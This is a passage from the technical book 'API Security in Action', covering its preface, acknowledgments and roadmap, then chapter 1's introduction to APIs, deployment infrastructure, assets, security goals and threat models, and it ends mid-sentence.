Setting up Kubernetes 532  index 535   preface  I have been a professional software developer, off and on, for about 20 years now, and I’ve worked with a wide variety of APIs over those years. My youth was spent hacking together adventure games in BASIC and a little Z80 machine code, with no concern that anyone else would ever use my code, let alone need to interface with it. It wasn’t until  I  joined  IBM  in  1999  as  a  pre-university  employee   affectionately  known  as “pooeys”  that I first encountered code that was written to be used by others. I remem- ber a summer spent valiantly trying to integrate a C++ networking library into a testing framework with only a terse email from the author to guide me. In those days I was more concerned with deciphering inscrutable compiler error messages than thinking about security.   Over time the notion of API has changed to encompass remotely accessed inter- faces  where  security  is  no  longer  so  easily  dismissed.  Running  scared  from  C++,  I found myself in a world of Enterprise Java Beans, with their own flavor of remote API calls  and  enormous  weight  of  interfaces  and  boilerplate  code.  I  could  never  quite remember what it was I was building in those days, but whatever it was must be tre- mendously important to need all this code. Later we added a lot of XML in the form of SOAP and XML-RPC. It didn’t help. I remember the arrival of RESTful APIs and then JSON as a breath of fresh air: at last the API was simple enough that you could stop and think about what you were exposing to the world. It was around this time that I became seriously interested in security.   In 2013, I joined ForgeRock, then a startup recently risen from the ashes of Sun Microsystems. They were busy writing modern REST APIs for their identity and access  xi   xii  PREFACE  management products,  and  I  dived right in.  Along  the  way,  I got  a  crash course in modern  token-based  authentication  and  authorization  techniques  that  have  trans- formed  API  security  in  recent  years  and  form  a  large  part  of  this  book.  When  I  was approached by Manning about writing a book, I knew immediately that API security would be the subject.   The outline of the book has changed many times during the course of writing it, but I’ve stayed firm to the principle that  details matter in security. You can’t achieve security purely at an architectural level, by adding boxes labelled “authentication” or “access control.” You must understand exactly what you are protecting and the guar- antees those boxes can and can’t provide. On the other hand, security is not the place to reinvent everything from scratch. In this book, I hope that I’ve successfully trodden a middle ground: explaining why things are the way they are while also providing lots of pointers to modern, off-the-shelf solutions to common security problems.    A  second  guiding  principle  has  been  to  emphasize  that  security  techniques  are rarely one-size-fits-all. What works for a web application may be completely inappro- priate for use in a microservices architecture. Drawing on my direct experience, I’ve included chapters on securing APIs for web and mobile clients, for microservices in Kubernetes  environments,  and  APIs  for  the  Internet  of  Things.  Each  environment brings its own challenges and solutions.   acknowledgments  I knew writing a book would be a lot of hard work, but I didn’t know that starting it would coincide with some of the hardest moments of my life personally, and that I would be ending it in the midst of a global pandemic. I couldn’t have got through it all without the unending support and love of my wife, Johanna. I’d also like to thank our daughter, Eliza  the littlest art director , and all our friends and family.   Next, I’d like to thank everyone at Manning who’ve helped turn this book into a reality. I’d particularly like to thank my development editor, Toni Arritola, who has patiently guided my teaching style, corrected my errors, and reminded me who I am writing for. I’d also like to thank my technical editor, Josh White, for keeping me hon- est with a lot of great feedback. A big thank you to everybody else at Manning who has helped me along the way. Deirdre Hiam, my project editor; Katie Petito, my copyedi- tor;  Keri  Hales,  my  proofreader;  and  Ivan  Martinovic´,  my  review  editor.  It’s  been  a pleasure working with you all.   I’d like to thank my colleagues at ForgeRock for their support and encouragement. I’d particularly like to thank Jamie Nelson and Jonathan Scudder for encouraging me to work  on  the  book,  and  to  everyone  who  reviewed  early  drafts,  in  particular  Simon Moffatt, Andy Forrest, Craig McDonnell, David Luna, Jaco Jooste, and Robert Wapshott.   Finally,  I’d  like  to  thank  Jean-Philippe  Aumasson,  Flavien  Binet,  and  Anthony Vennard at Teserakt for their expert review of chapters 12 and 13, and the anonymous reviewers of the book who provided many detailed comments.   To all the reviewers, Aditya Kaushik, Alexander Danilov, Andres Sacco, Arnaldo Gabriel, Ayala Meyer, Bobby Lin, Daniel Varga, David Pardo, Gilberto Taccari, Harinath  xiii   xiv  ACKNOWLEDGMENTS  Kuntamukkala, John Guthrie, Jorge Ezequiel Bo, Marc Roulleau, Michael Stringham, Ruben  Vandeginste,  Ryan  Pulling,  Sanjeev  Kumar  Jaiswal   Jassi ,  Satej  Sahu,  Steve Atchue, Stuart Perks, Teddy Hagos, Ubaldo Pescatore, Vishal Singh, Willhelm Lehman, and Zoheb Ainapore: your suggestions helped make this a better book.   about this book  Who should read this book API Security in Action is written to guide you through the techniques needed to secure APIs  in  a  variety  of  environments.  It  begins  by  covering  basic  secure  coding  tech- niques  and  then  looks  at  authentication  and  authorization  techniques  in  depth. Along the way, you’ll see how techniques such as rate-limiting and encryption can be used to harden your APIs against attacks.    This  book  is  written  for  developers  who  have  some  experience  in  building  web APIs and want to improve their knowledge of API security techniques and best prac- tices. You should have some familiarity with building RESTful or other remote APIs and  be  confident  in  using  a  programming  language  and  tools  such  as  an  editor  or IDE. No prior experience with secure coding or cryptography is assumed. The book will also be useful to technical architects who want to come up to speed with the latest API security approaches.  How this book is organized: A roadmap This book has five parts that cover 13 chapters.   Part 1 explains the fundamentals of API security and sets the secure foundation for  the rest of the book.    Chapter 1 introduces the topic of API security and how to define what makes an API secure. You’ll learn the basic mechanisms involved in securing an API and how to think about threats and vulnerabilities.  xv   xvi  ABOUT THIS BOOK    Chapter  2  describes  the  basic  principles  involved  in  secure  development  and how they apply to API security. You’ll learn how to avoid many common soft- ware  security  flaws  using  standard  coding  practices.  This  chapter  also  intro- duces the example application, called Natter, whose API forms the basis of code samples throughout the book.    Chapter 3 is a whirlwind tour of all the basic security mechanisms developed in the rest of the book. You’ll see how to add basic authentication, rate-limiting, audit logging, and access control mechanisms to the Natter API.  Part 2 looks at authentication mechanism for RESTful APIs in more detail. Authenti- cation is the bedrock upon which all other security controls build, so we spend some time ensuring this foundation is firmly established.    Chapter  4  covers  traditional  session  cookie  authentication  and  updates  it  for modern web API usage, showing how to adapt techniques from traditional web applications. You’ll also cover new developments such as SameSite cookies.    Chapter 5 looks at alternative approaches to token-based authentication, cover- ing bearer tokens and the standard Authorization header. It also covers using local storage to store tokens in a web browser and hardening database token storage in the backend.    Chapter 6 discusses self-contained token formats such as JSON Web Tokens and  alternatives.  Part 3 looks at approaches to authorization and deciding who can do what.    Chapter 7 describes OAuth2, which is both a standard approach to token-based  authentication and an approach to delegated authorization.    Chapter 8 looks in depth at identity-based access control techniques in which the identity of the user is used to determine what they are allowed to do. It covers access control lists, role-based access control, and attribute-based access control.   Chapter 9 then looks at capability-based access control, which is an alternative to  identity-based  approaches  based  on  fine-grained  keys.  It  also  covers  maca- roons,  which  are  an  interesting  new  token  format  that  enables  exciting  new approaches to access control.  Part  4  is  a  deep  dive  into  securing  microservice  APIs  running  in  a  Kubernetes environment.    Chapter 10 is a detailed introduction to deploying APIs in Kubernetes and best  practices for security from a developer’s point of view.    Chapter 11 discusses approaches to authentication in service-to-service API calls  and how to securely store service account credentials and other secrets.  Part 5 looks at APIs in the Internet of Things  IoT . These APIs can be particularly challenging to secure due to the limited capabilities of the devices and the variety of threats they may encounter.   ABOUT THIS BOOK  xvii    Chapter 12 describes how to secure communications between clients and ser- vices  in  an  IoT  environment.  You’ll  learn  how  to  ensure  end-to-end  security when API requests must travel over multiple transport protocols.    Chapter  13  details  approaches  to  authorizing  API  requests  in  IoT  environ- ments. It also discusses offline authentication and access control when devices are disconnected from online services.  About the code This book contains many examples of source code both in numbered listings and in line with normal text. In both cases, source code is formatted in a fixed-width font like this to separate it from ordinary text. Sometimes code is also in bold to high- light code that has changed from previous steps in the chapter, such as when a new feature adds to an existing line of code.   In many cases, the original source code has been reformatted; we’ve added line breaks  and  reworked  indentation  to  accommodate  the  available  page  space  in  the book. In rare cases, even this was not enough, and listings include line-continuation markers  ➥ . Additionally, comments in the source code have often been removed from the listings when the code is described in the text. Code annotations accompany many of the listings, highlighting important concepts.   Source code is provided for all chapters apart from chapter 1 and can be down- loaded from the GitHub repository accompanying the book at https:  github.com  NeilMadden apisecurityinaction or from Manning. The code is written in Java but has been  written  to  be  as  neutral  as  possible  in  coding  style  and  idioms.  The  examples should translate readily to other programming languages and frameworks. Full details of the required software and how to set up Java are provided in appendix A.  liveBook discussion forum Purchase of API Security in Action includes free access to a private web forum run by Manning Publications where you can make comments about the book, ask technical questions,  and  receive  help  from  the  author  and  from  other  users.

He has worked as a programmer for 20 years and holds a PhD in Computer Science.  xix   about the cover illustration  The  figure  on  the  cover  of  API  Security  in  Action  is  captioned  “Arabe  du  désert,”  or Arab man in the desert. The illustration is taken from a collection of dress costumes from various countries by Jacques Grasset de Saint-Sauveur  1757–1810 , titled Cos- tumes de Différents Pays, published in France in 1788. Each illustration is finely drawn and  colored  by  hand.  The  rich  variety  of  Grasset  de  Saint-Sauveur’s  collection reminds us vividly of how culturally apart the  world’s towns and regions  were just 200  years  ago.  Isolated  from  each  other,  people  spoke  different  dialects  and  lan- guages. In the streets or in the countryside, it was easy to identify where they lived and what their trade or station in life was just by their dress. The way we dress has changed since then and the diversity by region, so rich at the time, has faded away. It is now hard to tell apart the inhabitants of different continents, let alone different towns, regions, or  countries.  Perhaps  we  have  traded  cultural  diversity  for  a  more  varied  personal life—certainly for a more varied and fast-paced technological life. At a time when it is hard to tell one computer book from another, Manning celebrates the inventiveness and initiative of the computer business with book covers based on the rich diversity of regional life of two centuries ago, brought back to life by Grasset de Saint-Sauveur’s pictures.  xx   Part 1  Foundations  This part of the book creates the firm foundation on which the rest of the  book will build.   Chapter 1 introduces the topic of API security and situates it in relation to other security topics. It covers how to define what security means for an API and how to identify threats. It also introduces the main security mechanisms used in protecting an API.   Chapter 2 is a run-through of secure coding techniques that are essential to building secure APIs. You’ll see some fundamental attacks due to common cod- ing  mistakes,  such  as  SQL  injection  or  cross-site  scripting  vulnerabilities,  and how to avoid them with simple and effective countermeasures.   Chapter 3 takes you through the basic security mechanisms involved in API security: rate-limiting, encryption, authentication, audit logging, and authoriza- tion. Simple but secure versions of each control are developed in turn to help you understand how they work together to protect your APIs.   After reading these three chapters, you’ll know the basics involved in secur-  ing an API.       What is API security?  This chapter covers  What is an API?  What makes an API secure or insecure?  Defining security in terms of goals  Identifying threats and vulnerabilities  Using mechanisms to achieve security goals  Application Programming Interfaces  APIs  are everywhere. Open your smartphone or tablet  and  look  at  the  apps  you  have  installed.  Almost  without  exception,  those apps are talking to one or more remote APIs to download fresh content and mes- sages,  poll  for  notifications,  upload  your  new  content,  and  perform  actions  on your behalf.    Load your favorite web page with the developer tools open in your browser, and you’ll likely see dozens of API calls happening in the background to render a page that is heavily customized to you as an individual  whether you like it or not . On the server, those API calls may themselves be implemented by many microservices communicating with each other via internal APIs.   Increasingly, even the everyday items in your home are talking to APIs in the cloud—from  smart  speakers  like  Amazon  Echo  or  Google  Home,  to  refrigerators,  3   4  CHAPTER 1 What is API security?  electricity meters, and  lightbulbs.  The Internet  of  Things   IoT   is rapidly  becoming  a reality in both consumer and industrial settings, powered by ever-growing numbers of APIs in the cloud and on the devices themselves.    While  the  spread  of  APIs  is  driving  ever  more  sophisticated  applications  that enhance and amplify our own abilities, they also bring increased risks. As we become more dependent on APIs for critical tasks in work and play, we become more vulnera- ble  if  they  are  attacked.  The  more  APIs  are  used,  the  greater  their  potential  to  be attacked. The very property that makes APIs attractive for developers—ease of use— also makes them an easy target for malicious actors. At the same time, new privacy and data protection legislation, such as the GDPR in the EU, place legal requirements on companies to protect users’ data, with stiff penalties if data protections are found to be inadequate.  GDPR The General Data Protection Regulation  GDPR  is a significant piece of EU law that came into force in 2018. The aim of the law is to ensure that EU citizens’ personal data is not abused and is adequately protected by both technical and organizational controls. This includes security controls that will be covered in this book, as well as privacy techniques such as pseudonymization of names and other personal informa- tion  which we will not cover  and requiring explicit consent before collecting or shar- ing personal data. The law requires companies to report any data breaches within 72 hours and violations of the law can result in fines of up to €20 million  approximately $23.6 million  or 4% of the worldwide annual turnover of the company. Other jurisdic- tions are following the lead of the EU and introducing similar privacy and data protec- tion legislation.   1.1  This book is about how to secure your APIs against these threats so that you can confi- dently expose them to the world.   An analogy: Taking your driving test To illustrate some of the concepts of API security, consider an analogy from real life: taking your driving test. This may not seem at first to have much to do with either APIs or security, but as you will see, there are similarities between aspects of this story and key concepts that you will learn in this chapter.   You finish work at 5 p.m. as usual. But today is special. Rather than going home to tend to your carnivorous plant collection and then flopping down in front of the TV, you have somewhere else to be. Today you are taking your driving test.   You rush out of your office and across the park to catch a bus to the test center. As you stumble past the queue of people at the hot dog stand, you see your old friend Alice walking her pet alpaca, Horatio.     “Hi  Alice!”  you  bellow  jovially.  “How’s  the  miniature  recreation  of  18th-century  Paris coming along?”   “Good!” she replies. “You should come and see it soon.”   An analogy: Taking your driving test  5    She  makes  the  universally  recognized  hand-gesture  for  “call  me”  and  you  both  hurry on your separate ways.   You arrive at the test center a little hot and bothered from the crowded bus jour- ney. If only you could drive, you think to yourself! After a short wait, the examiner comes out and introduces himself. He asks to see your learner’s driving license and studies the old photo of you with that bad haircut you thought was pretty cool at the time. After a few seconds of quizzical stares, he eventually accepts that it is really you, and you can begin the test.  LEARN  ABOUT  IT Most  APIs  need  to  identify  the  clients  that  are interacting with  them.  As  these  fictional  interactions  illustrate,  there  may  be  different ways  of  identifying  your  API  clients  that  are  appropriate  in  different  situa- tions.  As  with  Alice,  sometimes  there  is  a  long-standing  trust  relationship based on a history of previous interactions, while in other cases a more formal proof  of  identity  is  required,  like  showing  a  driving  license.  The  examiner trusts the  license  because  it  is  issued  by  a  trusted body,  and  you  match  the photo on the license. Your API may allow some operations to be performed with only minimal identification of the user but require a higher level of iden- tity assurance for other operations.  You failed the test this time, so you decide to take a train home. At the station you buy a standard class ticket back to your suburban neighborhood, but feeling a little devil- may-care, you decide to sneak into the first-class carriage. Unfortunately, an attendant blocks your way and demands to see your ticket. Meekly you scurry back into standard class and slump into your seat with your headphones on.    When  you  arrive  home,  you  see  the  light  flashing  on  your  answering  machine. Huh, you’d forgotten you even had an answering machine. It’s Alice, inviting you to the hot new club that just opened in town. You could do with a night out to cheer you up, so you decide to go.   The doorwoman takes one look at you.   “Not tonight,” she says with an air of sniffy finality.   At  that  moment,  a  famous  celebrity  walks  up  and  is  ushered  straight  inside.  Dejected and rejected, you head home.    What you need is a vacation. You book yourself a two-week stay in a fancy hotel. While you are away, you give your neighbor Bob the key to your tropical greenhouse so that he can feed your carnivorous plant collection. Unknown to you, Bob throws a huge party in your back garden and invites half the town. Thankfully, due to a miscal- culation, they run out of drinks before any real damage is done  except to Bob’s repu- tation   and  the  party  disperses.  Your  prized  whisky  selection  remains  safely  locked away inside.   LEARN ABOUT IT Beyond just identifying your users, an API also needs to be able to decide what level of access they should have. This can be based on who they  are,  like  the  celebrity  getting  into  the  club,  or  based  on  a  limited-time   6  CHAPTER 1 What is API security?  token like a train ticket, or a long-term key like the key to the greenhouse that you lent your neighbor. Each approach has different trade-offs. A key can be lost or stolen and then used by anybody. On the other hand, you can have dif- ferent keys for different locks  or different operations  allowing only a small amount  of  authority  to  be  given  to  somebody  else.  Bob  could  get  into  the greenhouse and garden but not into your house and whisky collection.   When  you  return  from  your  trip,  you  review  the  footage  from  your  comprehensive  some  might  say  over-the-top   camera  surveillance  system.  You  cross  Bob  off  the Christmas  card  list  and  make  a  mental  note  to  ask  someone  else  to  look  after  the plants next time.    The next time you see Bob you confront him about the party. He tries to deny it at first, but when you point out the cameras, he admits everything. He buys you a lovely new Venus flytrap to say sorry. The video cameras show the advantage of having good audit logs so that you can find out who did what when things go wrong, and if neces- sary, prove who was responsible in a way they cannot easily deny.   DEFINITION An audit log records details of significant actions taken on a sys- tem, so that you can later work out who did what and when. Audit logs are crucial evidence when investigating potential security breaches.  You can hopefully now see a few of the mechanisms that are involved in securing an API, but before we dive into the details let’s review what an API is and what it means for it to be secure.   Traditionally, an API was provided by a software library that could be linked into an application either statically or dynamically at runtime, allowing reuse of procedures and functions for specific problems, such as OpenGL for 3D graphics, or libraries for TCP IP networking. Such APIs are still common, but a growing number of APIs are now made available over the internet as RESTful web services.   Broadly speaking, an API is a boundary between one part of a software system and another. It defines a set of operations that one component provides for other parts of the system  or other systems  to use. For example, a photography archive might pro- vide an API to list albums of photos, to view individual photos, add comments, and so on.  An  online  image  gallery  could  then  use  that  API  to  display  interesting  photos, while  a  word  processor  application  could  use  the  same  API  to  allow  embedding images into a document. As shown in figure 1.1, an API handles requests from one or more clients on behalf of users. A client may be a web or mobile application with a user interface  UI , or it may be another API with no explicit UI. The API itself may talk to other APIs to get its work done.   A UI also provides a boundary to a software system and restricts the operations that can  be  performed.  What  distinguishes  an  API  from  a  UI  is  that  an  API  is  explicitly designed to be easy to interact with by other software, while a UI is designed to be easy  1.2 What is an API?

Clients may be web browsers,  mobile apps, devices in the Internet of Things, or other APIs. The API services requests according  to its internal logic and then at some point returns a response to the client. The implementation of  the API may require talking to other “backend” APIs, provided by databases or processing systems.  for a user to interact with directly. Although a UI might present information in a rich form to make the information pleasing to read and easy to interact with, an API typi- cally will present instead a highly regular and stripped-back view of the raw data in a form that is easy for a program to parse and manipulate.  1.2.1  API styles There are several popular approaches to exposing remote APIs:   Remote Procedure Call  RPC  APIs expose a set of procedures or functions that can be called by clients over a network connection. The RPC style is designed to resemble normal procedure calls as if the API were provided locally. RPC APIs often use compact binary formats for messages and are very efficient, but usu- ally require the client to install specific libraries  known as stubs  that work with a single API. The gRPC framework from Google  https:  grpc.io  is an example of a modern RPC approach. The older SOAP  Simple Object Access Protocol  framework, which uses XML for messages, is still widely deployed.   A variant of the RPC style known as Remote Method Invocation  RMI  uses object- oriented techniques to allow clients to call methods on remote objects as if they were local. RMI approaches used to be very popular, with technologies such as CORBA and Enterprise Java Beans  EJBs  often used for building large   8  CHAPTER 1 What is API security?  enterprise systems. The complexity of these frameworks has led to a decline in their use.   The REST  REpresentational State Transfer  style was developed by Roy Fielding to describe the principles that led to the success of HTTP and the web and was later adapted as a set of principles for API design. In contrast to RPC, RESTful APIs emphasize standard message formats and a small number of generic operations to reduce the coupling between a client and a specific API. Use of hyperlinks to navigate the API reduce the risk of clients breaking as the API evolves over time.  Some APIs are mostly concerned with efficient querying and filtering of large data  sets,  such  as  SQL  databases  or  the  GraphQL  framework  from  Facebook  https:  graphql.org . In these cases, the API often only provides a few opera- tions  and  a  complex  query  language  allows  the  client  significant  control  over what data is returned.  Different API styles are suitable for different environments. For example, an organiza- tion that has adopted a microservices architecture might opt for an efficient RPC frame- work to reduce the overhead of API calls. This is appropriate because the organization controls all of the clients and servers in this environment and can manage distributing new stub libraries when they are required. On the other hand, a widely used public API might be better suited to the REST style using a widely used format such as JSON to maximize interoperability with different types of clients.  DEFINITION In a microservices architecture, an application is deployed as a collec- tion  of  loosely  coupled  services  rather  than  a  single  large  application,  or monolith. Each microservice exposes an API that other services talk to. Secur- ing microservice APIs is covered in detail in part 4 of this book.  This book will focus on APIs exposed over HTTP using a loosely RESTful approach, as this is the predominant style of API at the time of writing. That is, although the APIs that  are  developed  in  this  book  will  try  to  follow  REST  design  principles,  you  will sometimes deviate from those principles to demonstrate how to secure other styles of API design. Much of the advice will apply to other styles too, and the general princi- ples will even apply when designing a library.  1.3  API security in context API Security lies at the intersection of several security disciplines, as shown in figure 1.2. The most important of these are the following three areas:  1  Information  security   InfoSec   is concerned  with  the protection  of  information over its full life cycle from creation, storage, transmission, backup, and eventual destruction.  2 Network  security  deals  with  both the protection of  data  flowing over  a network  and prevention of unauthorized access to the network itself.  3 Application security  AppSec  ensures that software systems are designed and built  to withstand attacks and misuse.   API security in context  9  API security  Application  security  Network security  Information  security  Figure 1.2 API security lies at the  intersection of three security areas:  information security, network security,  and application security.  Each of these three topics has filled many books individually, so we will not cover each of them in full depth. As figure 1.2 illustrates, you do not need to learn every aspect of these topics to know how to build secure APIs. Instead, we will pick the most critical areas from each and blend them to give you a thorough understanding of how they apply to securing an API.   From information security you will learn how to:   Define your security goals and identify threats  Protect your APIs using access control techniques  Secure information using applied cryptography  DEFINITION Cryptography is the science of protecting information so that two or more people can communicate without their messages being read or tam- pered with by anybody else. It can also be used to protect information written to disk.  From network security you will learn:   The basic infrastructure used to protect an API on the internet, including fire- walls, load-balancers, and reverse proxies, and roles they play in protecting your API  see the next section    Use of secure communication protocols such as HTTPS to protect data trans-  mitted to or from your API  DEFINITION HTTPS is the name for HTTP running over a secure connection. While normal HTTP requests and responses are visible to anybody watching the network traffic, HTTPS messages are hidden and protected by Transport Layer Security  TLS, also known as SSL . You will learn how to enable HTTPS for an API in chapter 3.   10  CHAPTER 1 What is API security?  1.3.1  Finally, from application security you will learn:   Secure coding techniques  Common software security vulnerabilities  How to store and manage system and user credentials used to access your APIs  A typical API deployment An API is implemented by application code running on a server; either an application server such as Java Enterprise Edition  Java EE , or a standalone server. It is very rare to directly expose such a server to the internet, or even to an internal intranet. Instead, requests to the API will typically pass through one or more additional network services before  they  reach  your  API  servers,  as  shown  in  figure  1.3.  Each  request  will  pass through one or more firewalls, which inspect network traffic at a relatively low level and ensure that any unexpected traffic is blocked. For example, if your APIs are serv- ing requests on port 80  for HTTP  and 443  for HTTPS , then the firewall would be  configured  to  block  any  requests  for  any  other  ports.  A  load  balancer  will  then route  traffic  to  appropriate  services  and  ensure  that  one  server  is  not  overloaded with lots of requests while others sit idle. Finally, a reverse proxy  or gateway  is typi- cally placed in front of the application servers to perform computationally expensive operations  like  handling  TLS  encryption   known  as  SSL  termination   and  validating credentials on requests.  DEFINITION SSL  termination1   or  SSL  offloading   occurs  when  a  TLS  connec- tion from a client is handled by a load balancer or reverse proxy in front of the destination API server. A separate connection from the proxy to the back- end server is then made, which may either be unencrypted  plain HTTP  or encrypted as a separate TLS connection  known as SSL re-encryption .  Beyond these basic elements, you may encounter several more specialist services:   An API gateway is a specialized reverse proxy that can make different APIs appear as if they are a single API. They are often used within a microservices architec- ture to simplify the API presented to clients. API gateways can often also take care of some of the aspects of API security discussed in this book, such as authen- tication or rate-limiting.   A  web  application  firewall   WAF   inspects  traffic  at  a  higher  level  than  a  tradi- tional firewall and can detect and block many common attacks against HTTP web services.   An intrusion detection system  IDS  or intrusion prevention system  IPS  monitors traffic  within  your  internal  networks.  When  it  detects  suspicious  patterns  of activity it can either raise an alert or actively attempt to block the suspicious traffic.  1  In this context, the newer term TLS is rarely used.

Load balancer  Reverse  proxy  Reverse  proxy  Reverse  proxy  A load balancer distributes requests between servers.  Reverse proxies can do more complex routing and handle tasks such as SSL termination or rate-limiting on behalf of API servers.  API  server  API  server  API  server  API  server  API servers implement the API itself.  Load balancer  Database  Database  There may be additional load balancers and proxies separating API servers from databases or other services.  Figure 1.3 Requests to your API servers will typically pass through several other services first.  A firewall works at the TCP IP level and only allows traffic in or out of the network that matches  expected flows. A load balancer routes requests to appropriate internal services based on the  request and on its knowledge of how much work each server is currently doing. A reverse proxy  or API gateway can take care of expensive tasks on behalf of the API server, such as terminating  HTTPS connections or validating authentication credentials.  In practice, there is  often some overlap  between these services.  For example, many load balancers are also capable of performing tasks of a reverse proxy, such as termi- nating  TLS  connections,  while  many  reverse  proxies  can  also  function  as  an  API gateway.  Certain  more  specialized  services  can  even  handle  many  of  the  security mechanisms that you will learn in this book, and it is becoming common to let a gate- way or reverse proxy handle at least some of these tasks. There are limits to what these   12  CHAPTER 1 What is API security?  components can do, and poor security practices in your APIs can undermine even the most sophisticated gateway. A poorly configured gateway can also introduce new risks to your network. Understanding the basic security mechanisms used by these products will  help  you  assess  whether  a  product  is  suitable  for  your  application,  and  exactly what its strengths and limitations are.

If you don’t  want  a user to  perform some operation, then simply exclude it  from  the API. So why do we need to care about API security at all?    First, the same API may be accessible to users with distinct levels of authority; for  example,  with  some  operations  allowed  for  only  administrators  or  other users with a special role. The API may also be exposed to users  and bots  on the internet who shouldn’t have any access at all. Without appropriate access controls,  any  user  can  perform  any  action,  which  is  likely  to  be  undesirable. These are factors related to the environment in which the API must operate.   Second, while each individual operation in an API may be secure on its own, com- binations of operations might not be. For example, a banking API might offer separate withdrawal and deposit operations, which individually check that limits are not exceeded. But the deposit operation has no way to know if the money being  deposited  has  come  from  a  real  account.  A  better  API  would  offer  a transfer operation that moves money from one account to another in a single   Elements of API security  13  operation, guaranteeing that the same amount of money always exists. The secu- rity of an API needs to be considered as a whole, and not as individual operations.  Last,  there  may  be  security  vulnerabilities  due  to  the  implementation  of  the API. For example, failing to check the size of inputs to your API may allow an attacker to bring down your server by sending a very large input that consumes all available memory; a type of denial of service  DoS  attack.   DEFINITION A denial of service  DoS  attack occurs when an attacker can pre- vent legitimate users from accessing a service. This is often done by flooding a service with network traffic, preventing it from servicing legitimate requests, but can also be achieved by disconnecting network connections or exploiting bugs to crash the server.  Some  API  designs  are  more  amenable  to  secure  implementation  than  others,  and there are tools and techniques that can help to ensure a secure implementation. It is much easier  and cheaper  to think about secure development before you begin cod- ing rather than waiting until security defects are identified later in development or in production. Retrospectively altering a design and development life cycle to account for security is possible, but rarely easy. This book will teach you practical techniques for  securing  APIs,  but  if you  want a  more  thorough  grounding  in  how to design-in security  from  the  start,  then  I  recommend  the  book  Secure  by  Design  by  Dan  Bergh Johnsson, Daniel Deogun, and Daniel Sawano  Manning, 2019 .    It is important to remember that there is no such thing as a perfectly secure sys- tem, and there is not even a single definition of “security.” For a healthcare provider, being able to discover whether your friends have accounts on a system would be con- sidered a major security flaw and a privacy violation. However, for a social network, the same  capability  is  an  essential  feature.  Security  therefore  depends  on  the  context. There  are  many  aspects  that  should  be  considered  when  designing  a  secure  API, including the following:   The assets that are to be protected, including data, resources, and physical devices  Which security goals are important, such as confidentiality of account names  The mechanisms that are available to achieve those goals  The environment in which the API is to operate, and the threats that exist in that  Assets For  most  APIs,  the  assets  will  consist  of  information,  such  as  customer  names  and addresses, credit card information, and the contents of databases. If you store infor- mation about individuals, particularly if it may be sensitive such as sexual orientation or political affiliations, then this information should also be considered an asset to be protected.    There are also physical assets to consider, such as the physical servers or devices that your API is running on. For servers running in a datacenter, there are relatively  environment  1.4.1   14  CHAPTER 1 What is API security?  1.4.2  Security goals  few risks of an intruder stealing or damaging the hardware itself, due to physical pro- tections   fences,  walls,  locks,  surveillance  cameras,  and  so  on   and  the  vetting  and monitoring of staff that work in those environments. But an attacker may be able to gain  control  of  the  resources  that  the  hardware  provides  through  weaknesses  in  the operating system or software running on it. If they can install their own software, they may be able to use your hardware to perform their own actions and stop your legiti- mate software from functioning correctly.   In short, anything connected with your system that has value to somebody should be  considered  an  asset.  Put  another  way,  if  anybody  would  suffer  real  or  perceived harm if some part of the system were compromised, that part should be considered an asset to be protected. That harm may be direct, such as loss of money, or it may be more abstract, such as loss of reputation. For example, if you do not properly protect your users’ passwords and they are stolen by an attacker, the users may suffer direct harm  due  to  the  compromise  of  their  individual  accounts,  but  your  organization would also suffer reputational damage if it became known that you hadn’t followed basic security precautions.  Security goals are used to define what security actually means for the protection of your assets. There is no single definition of security, and some definitions can even be con- tradictory! You can break down the notion of security in terms of the goals that should be  achieved  or  preserved  by  the  correct  operation  of  the  system.  There  are  several standard security goals that apply to almost all systems. The most famous of these are the so-called “CIA Triad”:   Confidentiality—Ensuring information can only be read by its intended audience   Integrity—Preventing  unauthorized  creation,  modification,  or  destruction  of  information   Availability—Ensuring  that  the  legitimate  users  of  an  API  can  access  it  when  they need to and are not prevented from doing so.  Although these three properties are almost always important, there are other security goals that may be just as important in different contexts, such as accountability  who did what  or non-repudiation  not being able to deny having performed an action . We will discuss security goals in depth as you develop aspects of a sample API.    Security  goals  can  be  viewed  as non-functional  requirements   NFRs   and  considered alongside other NFRs such as performance or reliability goals. In common with other NFRs, it can be difficult to define exactly when a security goal has been satisfied. It is hard to prove that a security goal is never violated because this involves proving a nega- tive, but it’s also difficult to quantify what “good enough” confidentiality is, for example.   One  approach  to  making  security  goals  precise  is  used  in  cryptography.  Here, security goals are considered as a kind of game between an attacker and the system, with the attacker given various powers. A standard game for confidentiality is known   Elements of API security  15  as indistinguishability. In this game, shown in figure 1.4, the attacker gives the system two  equal-length  messages,  A  and  B,  of  their  choosing  and  then  the  system  gives back the encryption of either one or the other. The attacker wins the game if they can  determine  which  of  A  or  B  was  given  back  to  them.  The  system  is  said  to  be secure  for this security goal  if no realistic attacker has better than a 50:50 chance of guessing correctly.  Attacker  A  B  A or B?  Random choice  Encrypt  Key  Figure 1.4 The indistinguishability game used to define confidentiality in  cryptography. The attacker is allowed to submit two equal-length messages, A and  B. The system then picks one at random and encrypts it using the key. The system  is secure if no “efficient” challenger can do much better than guesswork to know  whether they received the encryption of message A or B.  Not every scenario can be made as precise as those used in cryptography. An alterna- tive is to refine more abstract security goals into specific requirements that are con- crete  enough  to  be  testable.  For  example,  an  instant  messaging  API  might  have  the functional requirement that users are able to read their messages. To preserve confidentiality, you may then add constraints that users are only able to read their own messages and that a user must be logged in before they can read their messages. In this approach, secu- rity  goals  become  constraints  on  existing  functional  requirements.  It  then  becomes easier to think up test cases. For example:   Create two users and populate their accounts with dummy messages.  Check that the first user cannot read the messages of the second user.  Check that a user that has not logged in cannot read any messages.  There  is  no  single  correct  way  to  break  down  a  security  goal  into  specific  require- ments, and so the process is always one of iteration and refinement as the constraints become clearer over time, as shown in figure 1.5. After identifying assets and defining security  goals,  you  break  down  those  goals  into  testable  constraints.  Then  as  you implement and test those constraints, you may identify new assets to be protected. For   16  CHAPTER 1 What is API security?  Develop and test  Deﬁne security  goals  Identify assets  Reﬁne into security  constraints  Figure 1.5 Defining security for your API consists of a four-step  iterative process of identifying assets, defining the security goals  that you need to preserve for those assets, and then breaking those  down into testable implementation constraints. Implementation may  then identify new assets or goals and so the process continues.  example, after implementing your login system, you may give each user a unique tem- porary  session  cookie.  This  session  cookie  is  itself  a  new  asset  that  should  be  pro- tected. Session cookies are discussed in chapter 4.   This iterative process shows that security is not a one-off process that can be signed off once and then forgotten about. Just as you wouldn’t test the performance of an API  only  once,  you  should  revisit  security  goals  and  assumptions  regularly  to  make sure they are still valid.  1.4.3  Environments and threat models  A good definition of API security must also consider the environment in which your API  is  to  operate  and  the  potential  threats  that  will  exist  in  that  environment.  A threat is simply any way that a security goal might be violated with respect to one or more  of  your  assets.  In  